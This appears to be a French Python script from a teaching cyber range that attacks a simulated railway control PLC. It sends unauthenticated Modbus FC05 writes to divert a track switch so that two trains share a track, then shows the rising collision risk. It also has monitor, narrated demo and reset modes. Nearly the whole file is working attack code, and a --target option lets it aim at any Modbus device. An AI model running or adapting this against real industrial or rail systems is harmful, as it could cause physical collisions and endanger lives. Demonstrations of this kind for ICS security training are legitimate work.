#!/usr/bin/env python3
"""
????????????????????????????????????????????????????????????????????????????????
?  SCÉNARIO C ? ATTAQUE CTC : DÉVIATION D'AIGUILLE                           ?
?  Cyber Range TER ? Démonstration pédagogique ICS Security                  ?
????????????????????????????????????????????????????????????????????????????????
?  Vecteur  : Modbus TCP FC05 (Write Single Coil)                             ?
?  Cible    : PLC B (OpenPLC) ? 192.168.20.10:502                             ?
?  Registre : coil 32 (%QX4.0 = CTC_AIGUILLE_CMD)                            ?
?  Impact   : Aiguille physique déviée ? deux trains sur même voie            ?
?             Risque de collision calculé en temps réel par le PLC            ?
????????????????????????????????????????????????????????????????????????????????
?  MITRE ATT&CK ICS :                                                         ?
?    T0855 ? Unauthorized Command Message                                     ?
?    T0831 ? Manipulation of Control                                          ?
?    T0816 ? Device Restart/Shutdown (variante)                               ?
????????????????????????????????????????????????????????????????????????????????
?  Usage :                                                                    ?
?    python3 attack_ctc_aiguille.py                 # Active l'aiguille       ?
?    python3 attack_ctc_aiguille.py --reset         # Remet en position       ?
?    python3 attack_ctc_aiguille.py --monitor       # Surveille en temps réel ?
?    python3 attack_ctc_aiguille.py --demo          # Mode démo progressif    ?
????????????????????????????????????????????????????????????????????????????????

CONTEXTE RÉALISTE :
  Un attaquant ayant accès au réseau OT L2 (via compromission d'un poste EWS
  ou rebond depuis L3) peut identifier les registres CTC via un scan Modbus
  (recon_modbus_scanner.py). La commande FC05 coil 32 prend < 10 ms à exécuter.
  Le PLC répond immédiatement : l'aiguille bascule sans aucune authentification.
"""

import argparse
import sys
import time

try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    print("[ERREUR] pymodbus non installé ? pip install pymodbus")
    sys.exit(1)

# ?? Configuration ?????????????????????????????????????????????????????????????
TARGET_IP    = '192.168.20.10'
TARGET_PORT  = 502
COIL_AIGUILLE = 32          # %QX4.0 ? CTC_AIGUILLE_CMD
HR_RISK       = 1094        # %MW70  ? CTC_COLLISION_RISK (lecture)
IR_DISTANCE   = 70          # %IW70  ? CTC_COLLISION_DISTANCE (lecture)
IR_RISK_LEVEL = 71          # %IW71  ? CTC_MET_RISK_LEVEL (lecture)
DISCR_AIGUILLE = 72         # %IX9.0 ? CTC_AIGUILLE_DEVIEE (feedback)
DISCR_ALM_AIG  = 73         # %IX9.1 ? CTC_ALM_AIGUILLE
DISCR_ALM_COLL = 74         # %IX9.2 ? CTC_ALM_COLLISION
IR_DKR_POS     = 32         # %IW32  ? DKR_MET_POSITION_TRAIN
IR_DMD_POS     = 42         # %IW42  ? DMD_MET_POSITION_TRAIN

COLORS = {
    'red':    '\033[91m',
    'orange': '\033[33m',
    'yellow': '\033[93m',
    'green':  '\033[92m',
    'cyan':   '\033[96m',
    'white':  '\033[97m',
    'bold':   '\033[1m',
    'reset':  '\033[0m',
    'blink':  '\033[5m',
}

def c(color, text):
    return f"{COLORS.get(color,'')}{text}{COLORS['reset']}"


def connect():
    client = ModbusTcpClient(TARGET_IP, port=TARGET_PORT, timeout=3)
    if not client.connect():
        print(c('red', f"[?] Connexion Modbus impossible ? {TARGET_IP}:{TARGET_PORT}"))
        sys.exit(1)
    return client


def read_ctc_state(client):
    """Retourne un dict avec l'état courant CTC."""
    d = client.read_discrete_inputs(DISCR_AIGUILLE, count=3)
    r = client.read_input_registers(IR_DISTANCE, count=2)
    pos = client.read_input_registers(IR_DKR_POS, count=13)
    risk_hr = client.read_holding_registers(HR_RISK, count=1)

    return {
        'aiguille_deviee': d.bits[0] if not d.isError() else False,
        'alm_aiguille':    d.bits[1] if not d.isError() else False,
        'alm_collision':   d.bits[2] if not d.isError() else False,
        'distance':        r.registers[0] if not r.isError() else 0,
        'risk_level':      r.registers[1] if not r.isError() else 0,
        'dkr_pos':         pos.registers[0] if not pos.isError() else 0,
        'dmd_pos':         pos.registers[10] if not pos.isError() else 0,
        'risk_hr':         risk_hr.registers[0] if not risk_hr.isError() else 0,
    }


def risk_bar(pct, width=30):
    filled = int(pct / 100 * width)
    color = 'red' if pct > 70 else 'orange' if pct > 40 else 'yellow'
    bar = c(color, '?' * filled) + c('white', '?' * (width - filled))
    return f"[{bar}] {c(color, f'{pct:3d}%')}"


def print_state(state, prefix=''):
    dist_km = state['distance'] / 1840 * 36
    aig_str = c('red', '? DÉVIÉE') if state['aiguille_deviee'] else c('green', '? NOMINALE')
    coll_str = c('red', c('blink', '? COLLISION IMMINENTE')) if state['alm_collision'] else ''

    print(f"\r{prefix}", end='')
    print(f"  Aiguille: {aig_str}  |  "
          f"Distance: {c('orange', f'{dist_km:.1f} km')} ({state['distance']} u)  |  "
          f"DKR: {state['dkr_pos']:4d}  DMD: {state['dmd_pos']:4d}  |  "
          f"Risque: {risk_bar(state['risk_level'])}  "
          f"{coll_str}", end='', flush=True)


def do_attack(client):
    """Active l'aiguille ? FC05 coil 32 = TRUE."""
    print(c('bold', "\n[ATTAQUE CTC] Écriture FC05 coil 32 ? TRUE"))
    print(f"  Target   : {c('cyan', TARGET_IP)}:{TARGET_PORT}")
    print(f"  Registre : coil {COIL_AIGUILLE} (%QX4.0 = CTC_AIGUILLE_CMD)")
    print(f"  Vecteur  : Modbus TCP FC05 ? aucune authentification requise")
    print(f"  MITRE    : T0855 ? Unauthorized Command Message\n")

    r = client.write_coil(COIL_AIGUILLE, True)
    if r.isError():
        print(c('red', f"[?] Écriture échouée : {r}"))
        return False

    print(c('red', "[?] Coil 32 activé ? AIGUILLE DÉVIÉE"))
    print(c('orange', "    Les deux trains convergent maintenant sur la même voie."))
    print(c('orange', "    Aucun conducteur n'est alerté. Le CTC affiche 'nominal'."))
    return True


def do_reset(client):
    """Remet l'aiguille en position nominale."""
    print(c('bold', "\n[RESET CTC] Écriture FC05 coil 32 ? FALSE"))
    r = client.write_coil(COIL_AIGUILLE, False)
    if r.isError():
        print(c('red', f"[?] Reset échoué : {r}"))
        return False
    print(c('green', "[?] Coil 32 à 0 ? aiguille remise en position nominale"))
    return True


def do_monitor(client, duration=120):
    """Surveille l'état CTC en temps réel pendant `duration` secondes."""
    print(c('bold', f"\n[MONITOR CTC] Surveillance {duration}s ? {TARGET_IP}:{TARGET_PORT}"))
    print(c('cyan', "  Ctrl+C pour arrêter\n"))
    t0 = time.time()
    while time.time() - t0 < duration:
        state = read_ctc_state(client)
        print_state(state)
        time.sleep(0.5)
    print()


def do_demo(client):
    """
    Mode démo automatisé avec narration :
    Phase 1 : État nominal (affichage 5s)
    Phase 2 : Activation de l'aiguille + surveillance montée du risque
    Phase 3 : Attente collision ou timeout 60s
    Phase 4 : Reset automatique
    """
    print(c('bold', "\n" + "="*70))
    print(c('bold', "  DÉMONSTRATION SCÉNARIO C ? ATTAQUE CTC CYBER RANGE TER"))
    print(c('bold', "="*70 + "\n"))

    # Phase 1 : Nominal
    print(c('cyan', "?? Phase 1 : État nominal (5 secondes) ??"))
    for _ in range(10):
        state = read_ctc_state(client)
        print_state(state, prefix='  ')
        time.sleep(0.5)
    print()

    # Phase 2 : Attaque
    print(c('orange', "\n?? Phase 2 : Injection de la commande d'attaque ??"))
    print(c('white', "  Vecteur  : Modbus FC05 sur réseau OT L2 non segmenté"))
    print(c('white', "  Cible    : coil 32 (%QX4.0) ? CTC_AIGUILLE_CMD"))
    time.sleep(1)
    print(c('red', "\n  [>] Envoi FC05 coil 32 = 1 ..."))
    time.sleep(0.3)
    r = client.write_coil(COIL_AIGUILLE, True)
    if r.isError():
        print(c('red', f"  [?] Échec : {r}"))
        return
    print(c('red', c('bold', "  [?] COIL 32 ACTIVÉ ? AIGUILLE DÉVIÉE !")))
    print(c('orange', "  Deux trains sur la même voie. Risque de collision en cours...\n"))

    # Phase 3 : Surveillance jusqu'à collision ou 60s
    print(c('orange', "?? Phase 3 : Escalade du risque ??"))
    t0 = time.time()
    collision_fired = False
    while time.time() - t0 < 75:
        s = read_ctc_state(client)
        print_state(s, prefix='  ')
        if s['alm_collision'] and not collision_fired:
            collision_fired = True
            print(c('red', c('bold', "\n\n  ? ALARME COLLISION DÉCLENCHÉE PAR LE PLC !")))
            print(c('red', "     CTC_ALM_COLLISION = TRUE (discrete 74)"))
            print(c('red', "     Distance inter-trains < 80 unités PLC (~1.6 km)\n"))
            time.sleep(3)
            break
        time.sleep(0.5)
    print()

    if not collision_fired:
        print(c('yellow', "\n  [i] Collision non déclenchée dans le délai (trains peut-être arrêtés)"))

    # Phase 4 : Reset
    print(c('cyan', "\n?? Phase 4 : Reset ??"))
    time.sleep(2)
    client.write_coil(COIL_AIGUILLE, False)
    print(c('green', "  [?] Aiguille remise en position nominale"))
    time.sleep(1)
    s = read_ctc_state(client)
    print_state(s, prefix='  ')
    print(c('green', "\n\n  [?] Système revenu en état nominal\n"))

    print(c('bold', "="*70))
    print(c('bold', "  FIN DE LA DÉMONSTRATION"))
    print(c('cyan', "  Scénario documenté : MITRE ATT&CK ICS T0855 + T0831"))
    print(c('bold', "="*70 + "\n"))


def main():
    global TARGET_IP
    parser = argparse.ArgumentParser(
        description='Scénario C ? Attaque CTC : déviation aiguille Modbus',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('--reset',   action='store_true', help='Remettre l\'aiguille en position nominale')
    parser.add_argument('--monitor', action='store_true', help='Surveiller l\'état CTC en temps réel')
    parser.add_argument('--demo',    action='store_true', help='Mode démo automatisé avec narration')
    parser.add_argument('--duration', type=int, default=120, help='Durée du monitor (défaut 120s)')
    parser.add_argument('--target',   default=TARGET_IP,   help=f'IP PLC cible (défaut {TARGET_IP})')
    args = parser.parse_args()

    TARGET_IP = args.target

    print(c('bold', c('cyan', "\n  ????????????????????????????????????????????????????")))
    print(c('bold', c('cyan',  "  ?  CYBER RANGE TER ? Scénario C : Attaque CTC      ?")))
    print(c('bold', c('cyan',  "  ????????????????????????????????????????????????????\n")))

    print(f"  Connexion ? {c('cyan', TARGET_IP)}:{TARGET_PORT} ...")
    client = connect()
    print(c('green', f"  [?] Connecté\n"))

    # Afficher l'état initial
    s = read_ctc_state(client)
    print(f"  État initial :")
    print_state(s, prefix='  ')
    print('\n')

    if args.demo:
        do_demo(client)
    elif args.reset:
        do_reset(client)
    elif args.monitor:
        do_monitor(client, args.duration)
    else:
        # Par défaut : activer l'aiguille puis monitorer
        if do_attack(client):
            print(c('cyan', "\n  [>] Surveillance du risque (Ctrl+C pour arrêter) ...\n"))
            do_monitor(client, args.duration)

    client.close()


if __name__ == '__main__':
    main()
